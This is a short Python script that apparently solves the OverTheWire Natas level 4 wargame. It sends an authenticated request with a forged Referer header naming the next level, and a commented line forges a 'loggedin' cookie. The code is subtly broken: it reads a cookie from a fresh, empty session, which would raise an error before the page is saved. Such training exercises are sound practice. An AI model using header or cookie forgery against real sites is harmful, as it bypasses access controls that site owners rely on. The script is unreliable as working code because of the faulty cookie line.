import requests

# i = input("Enter the Level number of natas: ")
# userName = f'natas{i}'

userName = 'natas4'
fileContent = open('C:\\Users\\niroj\\Documents\\Natas\\password.txt')

# passwordIndex = int(i) - 1
password = fileContent.readlines()[3][7:39]
# print(password)

url = f'http://{userName}.natas.labs.overthewire.org'

# use headers to redirect  
header =  {"Referer" : "http://natas5.natas.labs.overthewire.org"}
response = requests.get(url, auth = (userName, password), headers = header)
htmlDoc = response.text

print(htmlDoc)

# cookies = { "loggedin" : "1" }

print(requests.session().cookies['loggedin'])

try:
    with open('C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\index.html', 'w') as htmlContent:
        htmlContent.writelines(htmlDoc)
        print("Operation success!")
except IOError as e:
    print(f'Unexpected though: {e}')

